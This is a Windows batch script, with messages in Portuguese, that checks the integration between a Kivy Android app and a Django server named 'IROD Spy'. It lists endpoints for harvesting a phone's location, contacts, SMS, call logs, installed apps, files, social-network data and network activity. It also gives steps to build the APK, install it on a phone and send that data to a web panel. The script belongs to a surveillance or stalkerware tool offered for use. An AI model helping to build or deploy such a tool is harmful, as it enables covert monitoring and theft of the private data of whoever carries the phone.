@echo off
echo ========================================
echo   VERIFICANDO INTEGRACAO KIVY → IROD SPY
echo ========================================

echo 1. Testando APIs do Django...
cd Spy
venv\Scripts\activate && python ..\testar_integracao.py

echo.
echo 2. Verificando configuracoes do app Kivy...
cd ..\Spy-mobile
echo IP configurado no app: 192.168.0.97
echo Porta: 8000
echo.
echo Endpoints configurados:
echo - Localizacao: /api/localizacao/
echo - Contatos: /api/contatos/
echo - SMS: /api/sms/
echo - Chamadas: /api/chamadas/
echo - Apps: /api/apps/
echo - Upload: /api/upload/
echo - Redes Sociais: /api/redes-sociais/
echo - Atividade Rede: /api/atividade-rede/

echo.
echo ========================================
echo   STATUS DA INTEGRACAO
echo ========================================
echo.
echo ✓ App Kivy CONFIGURADO para IROD Spy
echo ✓ IP correto: 192.168.0.97:8000
echo ✓ Todas as APIs implementadas
echo ✓ Coleta de dados completa
echo.
echo FUNCIONAMENTO:
echo 1. Usuario clica PLAY no app
echo 2. App coleta dados do dispositivo
echo 3. Dados sao enviados para IROD Spy
echo 4. Dados aparecem no painel web
echo.
echo Para testar:
echo 1. Gere o APK: build-android.bat
echo 2. Instale no celular
echo 3. Clique PLAY
echo 4. Verifique dados no IROD Spy
echo.
pause